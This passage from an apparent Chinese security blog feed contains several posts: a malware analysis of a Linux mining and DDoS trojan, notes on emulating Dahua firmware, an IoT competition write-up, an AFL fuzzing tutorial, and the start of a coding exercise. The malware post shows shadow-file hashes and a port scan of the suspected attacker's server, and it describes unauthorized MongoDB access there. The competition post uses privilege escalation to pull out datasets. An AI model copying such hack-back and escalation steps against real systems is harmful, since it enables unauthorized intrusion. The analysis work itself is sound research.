<p>分析attack发现存在udp，进一步判断木马的攻击行为很可能是DDos攻击</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/t5fxviczpLlrako.png" alt="image-20220106141826387"></p>
<p>开机启动项木马攻击总结：此次攻击应该是先通过暴力破解huawei帐户密码，弱口令来植入木马，木马添加DbSecuritySpt服务到自启中，DbSecuritySpt是木马主程序，又有回传受控地址，但是木马程序中并没有直接的服务器域名或者是攻击者的ip，而是有一串非常长的字符串（加密了的），如果能破解出来应该就能知道攻击者的信息了，经过gdb逐步调试，到第二次解密函数前需要绕过反gdb调试，绕过后在gdb中可以看到攻击者的ip和域名（wireshark并没有抓到ip只有域名，域名已经过期无法解析，但是攻击者的域名解析ip隐藏在木马中被泄露）</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/uIaq34TKV5F8pNo.png" alt="image-20211226180045128"></p>
<p>对其他文件（木马）的分析，按照可疑时间揪出来另外两个木马程序，分别是sphp和spts，查看管理员权限用户：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/mnt<span class="comment"># awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; etc/passwd</span></span><br><span class="line">root</span><br><span class="line">mysq1</span><br><span class="line">f1</span><br></pre></td></tr></table></figure>

<p>查看能远程登录的用户：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/mnt<span class="comment"># awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; etc/shadow</span></span><br><span class="line">huawei:$6$JwPdv1QU<span class="variable">$jaYTZgzRES8I6H02D03KgfC9NQW5FuL0K</span>./q3.GPO6ebgpM/BmU/wWjl8ePdAlvXqrd03p6LcWbG9.S.PFJqv1:18957:0:99999:7:::</span><br><span class="line">mysq1:$1$mysq1<span class="variable">$dDX0</span>.Cns4QkH589JvATFI.:18904:0:99999:7:::</span><br><span class="line">f1:$6$.oQp1HQe<span class="variable">$RFmUfOrQ449leF16Vu287OWYg2Jy0PR2uxNGuUXsVBVT3</span>.mGK0oohPOxlgb.HAA9r/H0YDCM7E8ZRNeWaPw5t/:18957:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>查看可以，sphp木马文件加了一层upx的壳</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/qVxAwgDKnYa9kvr.png" alt="image-20211224145615037"></p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/dZQhMgSWz5kO1xB.png" alt="image-20211224180045212"></p>
<h2 id="沙箱检测："><a href="#沙箱检测：" class="headerlink" title="沙箱检测："></a>沙箱检测：</h2><p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/RflJ8hWzHYIF7OU.png" alt="image-20211226152330702"></p>
<p>这个木马加上了upx的壳</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/FjsNTIKYLe9Q83S.png" alt="image-20211226152409199"></p>
<p>45.77.67.13是一个德国的ip</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/aPLjA62JxdXvK1Y.png" alt="image-20211226152454729"></p>
<p>分析sbin，在时间点Oct 17时间，https和httpss修改过</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/SEdCswZayJLl2Yq.png" alt="image-20211226160702559"></p>
<p>查看httpss</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/L4xdq59jhDJ7eH3.png" alt="image-20211226160757330"></p>
<p>把https放到沙箱分析</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/RNOQEAx9ipbFMmG.png" alt="image-20211226161202879"></p>
<p>于此同时，还找到一个跟https连同工作的几个马，它们都是矿马，</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/vmktDYdPTqwfiUB.png" alt="image-20220106152338317"></p>
<p>其中需要分析shh木马，是一个加了upx的壳，需要先脱壳处理</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/TEnqRbJtdXi62Zy.png" alt="image-20220106152228756"></p>
<p>然后ida逆向出来发现有挖矿的账号登录操作</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/I7O5ouyLHgnPVG1.png" alt="image-20220106152440986"></p>
<h2 id="对可疑攻击者进行渗透"><a href="#对可疑攻击者进行渗透" class="headerlink" title="对可疑攻击者进行渗透"></a>对可疑攻击者进行渗透</h2><p>这里是对在DbSecuritySpt木马(用于DDos攻击的木马)中泄露的ip进行渗透，ip为115.231.218.64</p>
<p>端口扫描</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PS D:\GitHub\dirsearch&gt; nmap -PN 115.231.218.64</span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-06 17:47 ?D1ú±ê×?ê±??</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 115.231.218.64</span><br><span class="line">Host is up (0.074s latency).</span><br><span class="line">Not shown: 961 closed ports</span><br><span class="line">PORT      STATE    SERVICE</span><br><span class="line">23/tcp    filtered telnet</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">53/tcp    filtered domain</span><br><span class="line">88/tcp    open     kerberos-sec</span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">389/tcp   filtered ldap</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">464/tcp   filtered kpasswd5</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">636/tcp   filtered ldapssl</span><br><span class="line">1022/tcp  filtered exp2</span><br><span class="line">1023/tcp  filtered netvenuechat</span><br><span class="line">1025/tcp  filtered NFS-or-IIS</span><br><span class="line">1720/tcp  filtered h323q931</span><br><span class="line">1723/tcp  filtered pptp</span><br><span class="line">3001/tcp  filtered nessus</span><br><span class="line">3003/tcp  filtered cgms</span><br><span class="line">3306/tcp  open     mysql</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">4899/tcp  filtered radmin</span><br><span class="line">5000/tcp  open     upnp</span><br><span class="line">5100/tcp  open     admd</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6000/tcp  open     X11</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">6669/tcp  filtered irc</span><br><span class="line">7000/tcp  open     afs3-fileserver</span><br><span class="line">7100/tcp  open     font-service</span><br><span class="line">8088/tcp  open     radan-http</span><br><span class="line">8899/tcp  open     ospf-lite</span><br><span class="line">49152/tcp open     unknown</span><br><span class="line">49153/tcp open     unknown</span><br><span class="line">49154/tcp open     unknown</span><br><span class="line">49155/tcp open     unknown</span><br><span class="line">49156/tcp open     unknown</span><br><span class="line">49157/tcp open     unknown</span><br><span class="line">49163/tcp open     unknown</span><br></pre></td></tr></table></figure>

<p>在88端口下<a href="http://115.231.218.64:88/assets/">http://115.231.218.64:88/assets/</a></p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/e9nTWdI4yiSxQpj.png" alt="image-20220107161119533"></p>
<p>从其他目录可以看出，这个攻击者的服务器还用于做游戏，其中一个目录下发现了qq群图片</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/v9SkqupXLQ7VRyW.png" alt="image-20220107160503857"></p>
<p>发现的确是一个游戏相关的</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/TgQUASW9ldR7Z2h.png" alt="image-20220107162020365"></p>
<p>mysql、phpstudy暂未发现可以利用的漏洞，但是Mongo存在未授权访问，可以直接连上数据库，不过数据库内容是一些玩家的账号和密码信息等，并没有攻击者或者管理员的一些可利用的信息</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/856hQvflWi3GmMq.png" alt="image-20220107163253401"></p>
<p>如果需要进一步调查，最好的办法是直接进行社工</p>
<h2 id="挖矿木马shh分析"><a href="#挖矿木马shh分析" class="headerlink" title="挖矿木马shh分析"></a>挖矿木马shh分析</h2><p>运行shh矿马后，发现CPU已经开始超频</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/Q5hegZMzn7xrIuc.png" alt="image-20220107105626190"></p>
<p>shh开了很多保护，比如ASLR、PIE、NX</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/viDNdzqFHLAl8KB.png" alt="image-20220107165554042"></p>
<p>因为开启了PIE，每次启动程序基地址都会是一个随机的值，无法直接通过ida去定位，所以需要先计算出基地址，可以通过vmmap查看，试了第二个，然后加上ida上的偏移，成功断点定位到start的地址了</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/5iIpe3jCbB4XL89.png" alt="image-20220107144045753"></p>
<p>不过通过gdb -p的方式去调试，已经错过了输入账号密码的时候了，尝试去寻找账号配置文件，config.json</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/QntW3UhHjoklLw4.png" alt="image-20220107143706426"></p>
<p>用find去全盘搜</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/5SzBk2ZnhVlUjoa.png" alt="image-20220107144620862"></p>
<p>有一个config.json值得怀疑，因为时间跟木马感染主机时间差不多，但cat后，发现是网关地址</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/KjPcxeTiOm1z6WI.png" alt="image-20220107144912463"></p>
<p>ida继续往下翻字符串可以找到攻击者的比特币钱包地址为：8612WpYrCaST2SgtVHHvyL9SApwUKHbRV3VeYVRFG5J7SqskQJetpAYYXpoAchKsMdVN7t1au1Bo8PK7PiXp2Cdg7j3nxnE</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/g5Qw1AtbaXmM4ye.png" alt="image-20220107152020418"></p>
<p>挖矿木马用的是xmrig，攻击者的钱包地址已经逆向分析出来，但是无法溯源，攻击者没有和木马有直接的联系，而是直接把自己钱包地址的挖矿木马感染到主机</p>
]]></content>
      <tags>
        <tag>实战</tag>
        <tag>木马</tag>
      </tags>
  </entry>
  <entry>
    <title>DaHuaFirmware_emulation</title>
    <url>/2021/11/14/DaHuaFirmware-emulation/</url>
    <content><![CDATA[<h1 id="大华固件模拟"><a href="#大华固件模拟" class="headerlink" title="大华固件模拟"></a>大华固件模拟</h1><p>用grep搜httpd的方式找到web服务启动脚本，为sonia，arm架构，小端可执行文件</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/tsbjLYCefXMHo3g.png" alt="image-20211114170159417"></p>
<p>qemu用户模式去启动，发现报错，卡在了PDI_productGetHwidInfoByChip函数</p>
<p><code>qemu-arm -L . ./bin/sonia</code></p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/no6VRXcf58ES2Jh.png" alt="image-20211114170325784"></p>
<p>grep搜一下这个函数，发现此函数是在lib目录下名为libpdi.so的动态链接库文件中</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/9YcGfu4BVDiZXJw.png" alt="image-20211114170523467"></p>
<p>把这个动态链接库反汇编然后查看这个PDI_productGetHwidInfoByChip函数，发现是存在一个死循环，推测我们是进入了这个循环所导致的</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/mIBZ4aPpfeYMugo.png" alt="image-20211114170856013"></p>
<p>一开始我单独的去把while的死循环给patch掉了，可以管一时之用，但后面紧接着又报错很多其他类似上述死循环的函数，而且不太好改，推测它处于一个大范围的硬件函数中，因此我们这里可以查看谁调用了PDI_productGetHwidInfoByChip函数（但目前来说很多不太好确定是谁）或者把这个函数直接返回0（采用这种方式）</p>
<p>把PDI_productGetHwidInfoByChip函数patch为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV.W R0, #0				</span><br><span class="line">BX LR</span><br></pre></td></tr></table></figure>

<p>上面的两段汇编相当于return 0，改完后PDI_productGetHwidInfoByChip函数是这样的，直接返回0了</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/zxZNJnMl9uhOavQ.png" alt="image-20211114171554787"></p>
<p>改完后输出了很多的信息，但是在PDI_getChipInfo处卡住了</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/uRz1AE7LjeZSmrW.png" alt="image-20211114171819893"></p>
<p>同样先grep，发现这个函数同样是在这个libpdi.so动态链接库中的，反汇编发现也是卡在了一个while(1)的死循环地方</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/48LklJQ7CEBr3Ds.png" alt="image-20211114171959990"></p>
<p>查看它的调用，还是太多了，因此继续改，不过跟上面有点区别</p>
<p>修改内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CBZ R0, loc_78C1C 修改为了B loc_78C1C</span><br><span class="line">MOV.W R0, #0xFFFFFFFF 修改为了MOV.W R0, #0</span><br></pre></td></tr></table></figure>

<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/nw9maAoh3G7OD5b.png" alt="image-20211114172443175"></p>
<p>改完后反汇编ok</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/W7BshL8mxprHGuS.png" alt="image-20211114172334752"></p>
<p>输出的信息又多了一倍，卡在了函数PDI_productGetInfo处</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/OnLqWuMbSdyhJow.png" alt="image-20211114172553762"></p>
<p>又是这种死循环，出错函数是PDI_productGetInfo</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/jZsDyaKhSNmeL3Q.png" alt="image-20211114172911172"></p>
<p>因为函数开头又很多寄存器，其实也可以直接覆盖用我们自己的return 0汇编指令，但最好还是间接，对arm不熟悉还是拿个中间跳板吧</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/nyht2CXPaBMpkd1.png" alt="image-20211114173152700"></p>
<p>修改如下</p>
<p>CBZ R0, loc_78F74 ——&gt;B loc_78F74</p>
<p>MOV.W R0, #0xFFFFFFFF —&gt; MOV.W R0, #0</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/4wSZqKmuDGyTg2V.png" alt="image-20211114173952907"></p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/jcZA3glotquMwWU.png" alt="image-20211114173940671"></p>
<p>又卡住了，并且输出了上一次改动的地方旁边的信息</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/vNg2I6KhPr7eyUm.png" alt="image-20211114174159009"></p>
<p>卡住的函数为PDI_productGetName，调用成功应该返回0</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/l6yJtKOfS1YZWbQ.png" alt="image-20211114174319545"></p>
<p>同理修改</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/2wMbjzGtiKnsH9C.png" alt="image-20211114174645437"></p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/GwPOkrc13VMILzd.png" alt="image-20211114174657173"></p>
<p>提示段错误</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/cjio9SZI3lPmFvt.png" alt="image-20211114174751221"></p>
<p>查看有哪些调用了PDI_productGetName函数，发现挺多的，随便点进去几个看看</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/jtD2KSYd7ozgckT.png" alt="image-20211114180035418"></p>
<p>在PDI_getFaceboardCfg函数里发现原因就是调用PDI_productGetName函数时传进来的参数（作为PDI设备名字的）为空或者非法值导致的崩溃，返回值并没有错应该是0</p>
<p>这个函数可以发现，下面如”SD6C80FA-GNX”、”SD6C82FA-GNX”等为合法的设备名字，如果我们在调用设备的时候给参数赋值为前面合法的值就好啦</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/RFoCSmvx8rf7Wls.png" alt="image-20211114175833570"></p>
<p>同理其他调用者也可能会出现上述错误</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/WlkfCdpNzX1AZn7.png" alt="image-20211114180356461"></p>
<p>在上述libpdi.so几个函数中依然没有找到是谁调用PDI_productGetName函数时产生的错误，因为我搜索最近的输出的信息的字符串并没有，因此推测可能是其他二进制文件调用了此函数产生的报错！去看看，grep找一下是谁，</p>
<p>因此我们换一种角度，可能是别的二进制文件调用了此动态链接库的PDI_productGetName函数，因此去grep一下字符串”Video Server - (C) 2011-2013 ZheJiang Dahua Technology“果然有个sonia</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/s3QmNrznjyYKWxf.png" alt="image-20211114181559702"></p>
<p>找到这段字符串的地址，进去看看调用它的函数</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/draDWGunb9vHsiM.png" alt="image-20211114181836068"></p>
<p>函数sub_9BBA09就是输出蓝绿色字符串信息的函数了，但是它下面并没有调用出错的函数，查看调用它的函数只有sub_9BBAA2调用过它两次</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/XavHeb3l5STEVpw.png" alt="image-20211114181906342"></p>
<p>总启动函数：sub_3B2F8</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/wfmZYVa1bdXhuDO.png" alt="image-20211114191306016"></p>
<p>将出错的函数NOP掉直接乱了，似乎这样并不可取</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/xZq51YumJlKsDbU.png" alt="image-20211114191405670"></p>
<p>但是这样能运行，只不过好像又卡了一个死循环，但这个死循环还没找到是在动态链接库libpdi.so的哪个地方</p>
<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/v49hHzdKo3YnxjA.png" alt="image-20211114191515211"></p>
<p>后续仍在研究中</p>
]]></content>
      <tags>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>DataCon-物联网安全赛题一wp</title>
    <url>/2021/10/28/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98-%E5%9B%BA%E4%BB%B6%E6%8C%96%E6%8E%98%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%80wp/</url>
    <content><![CDATA[<h2 id="数据集抓取整体思路"><a href="#数据集抓取整体思路" class="headerlink" title="数据集抓取整体思路"></a>数据集抓取整体思路</h2><p>datacon21比赛的实验服务器使用了阿里云，访问界面和主机之间的ssh信道通过websocket建立，通过抓包分析即可得到在web ssh终端的数据。通过这种方式可以把所有数据集中的数据打印到终端，再抓包还原。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="https://vk9-sec.com/apt-get-privilege-escalation/">https://vk9-sec.com/apt-get-privilege-escalation/</a></p>
<h2 id="制作数据"><a href="#制作数据" class="headerlink" title="制作数据"></a>制作数据</h2><p>为了解决二进制不能打印的问题，使用了base64编码的方式打印。</p>
<p>思路是分文件夹压缩，之后base64编码为可打印字符，并在base64编码后文本文件的头尾添加标识。</p>
<p>标识符包括分隔符”:”，定界符F0F0F0，文件名，行号。添加标识的原因是ssh传输中还需要打印控制字符，以及文件传输过大可能会遇到各种网络问题，添加标识会方便数据还原和调试。</p>
<p>for f in <code>ls /home/datacon/supplychain/dataset</code> ; do tar -czvf /home/datacon/disk/sc/$f.tar.gz /home/datacon/supplychain/dataset/$f ;done</p>
<p>for f in <code>ls /home/datacon/supplychain/dataset</code> ; do base64 sc/$f.tar.gz -w 1000 | nl -s “:” -w 10 -n “rz” | sed “s/^/:F0F0F0:$f:/“ | sed “s/$/:/“ &gt; sct/$f.txt ;done</p>
<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/FsIuRUl2ZDWk6g5.png" alt="image2021-10-12_22-25-18"></p>
<h2 id="Fiddle"><a href="#Fiddle" class="headerlink" title="Fiddle"></a>Fiddle</h2><p>设置代理抓Websocket的包。</p>
<p>添加自定义规则</p>
<p>  static function OnWebSocketMessage(oMsg: WebSocketMessage) {<br>    // Log Message to the LOG tab<br>    Utilities.WriteArrayToFile(“E:\TEMP\datacon21\“+oMsg.ID,oMsg.PayloadAsBytes());</p>
<p>​    //把传输的内容存储到E:\TEMP\datacon21{消息ID}。<br>  }</p>
<h4 id="危险函数处理"><a href="#危险函数处理" class="headerlink" title="危险函数处理"></a>危险函数处理</h4><p>脚本：</p>
<p>idapython批量脚本危险函数扫描</p>
<p>首先用ida命令行模式实现ida差距批量跑二进制文件</p>
<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/e1gBFRm853zEcP6.png" alt="image-20211027151956014"></p>
<p>危险函数扫描，用ida-python数据交叉和和代码交叉去遍历搜索全文的危险函数调用</p>
<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/XIr2ah1qVEPbwm5.png" alt="image-20211027152154471"></p>
<p>跑完后的结果：</p>
<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/qL3ojvVUBGyrIdh.png" alt="image-20211027152321164"></p>
<p>对结果进行清洗脚本（还需要手动在txt中替换掉一些）：</p>
<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/3RkcEIoygbmLFwr.png" alt="image-20211027152516855"></p>
<p>改进：用SaTC去跑不同的固件</p>
<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/zLAg4XkfKwBYbGq.png" alt="image-20211027154052745"></p>
<p>得到部分命令注入有关的危险函数地址</p>
<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/nuASNId9mZPfW1C.png" alt="image-20211027154300951"></p>
<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/Z6tOb8zLnGCWwYF.png" alt="image-20211027154557847"></p>
<p>用SaTC跑的过程</p>
<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/QIOrLYPCAc8aef6.png" alt="image-20211027155715171"></p>
]]></content>
      <tags>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzz学习入门之Fuzzing-OpenEuler-file5.41</title>
    <url>/2022/03/06/Fuzz%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%B9%8BFuzzing-OpenEuler-file5-41/</url>
    <content><![CDATA[<p>下载AFL</p>
<p><code>git clone https://github.com/google/AFL.git</code></p>
<p><strong>Tips：需要将AFL/llvm_mode目录下alf-clang-fast.c中131~134行的代码给去掉，不然编译的时候会报错</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081b92mkj21240u0ti7.jpg" alt="image-20220306154520627"></p>
<p>在AFL下make生成fuzzer</p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081a3npvj21730u0gy1.jpg" alt="image-20220306154652875"></p>
<p>下载测试的项目：</p>
<p><code>git clone https://gitee.com/src-openeuler/file.git</code></p>
<p>把C和C++的编译器改为afl的afl-clang-fast和afl-clang-fast++</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=/home/re1own/github/AFL/afl-clang-fast</span><br><span class="line"><span class="built_in">export</span> CXX=/home/re1own/github/AFL/afl-clang-fast++</span><br></pre></td></tr></table></figure>

<p>指定下安装目录</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./configure --enable-shared=no --prefix=/home/re1own/Project/install/</span><br></pre></td></tr></table></figure>

<p>编译安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081c4ux2j21c00u0gs5.jpg" alt="image-20220306151917157"></p>
<p>编译安装完之后可以发现在之前创建和制定的install目录下有了用AFL插桩生成的目标程序了</p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081arcmrj20zk09k3z2.jpg" alt="telegram-cloud-photo-size-5-6131935855611326493-y"></p>
<p><code>strings file | grep &quot;afl&quot;</code>检查下是否插桩成功，字符串中有afl结合前面编译安装没有报错说明应该插桩成功了</p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081cnef3j20lm0l4goi.jpg" alt="image-20220306153619409"></p>
<p>创建input、output文件夹，测试项目的tests文件下有输入文件，我们把它们转到input中当作种子，然后就可以用afl去fuzzing了</p>
<p><code>afl-fuzz -i input -o output -m none -t 500+ -- /home/re1own/Project/install/bin/file @@</code></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081d4vn0j21c00u07bt.jpg" alt="image-20220306155011256"></p>
<p>实验相关文件链接：<a href="https://github.com/Re1own/IoT_Sec/tree/main/Fuzz/openEuler/file-5.41">https://github.com/Re1own/IoT_Sec/tree/main/Fuzz/openEuler/file-5.41</a></p>
]]></content>
      <tags>
        <tag>fuzz</tag>
        <tag>OpenEuler</tag>
      </tags>
  </entry>
  <entry>
    <title>Dynamic_Practice</title>
    <url>/2022/11/21/Dynamic-Practice/</url>
    <content><![CDATA[<h3 id="70-Climbing-Stairs"><a href="#70-Climbing-Stairs" class="headerlink" title="70.Climbing Stairs"></a>70.Climbing Stairs</h3><p><strong>Description:</strong></p>
<p>You are climbing a staircase. It takes <code>n</code> steps to reach the top.</p>
<p>Each time you can either climb <code>1</code> or <code>2</code> steps. In how many distinct ways can you climb to the top?</p>
<p><strong>Example 1:</strong></p>
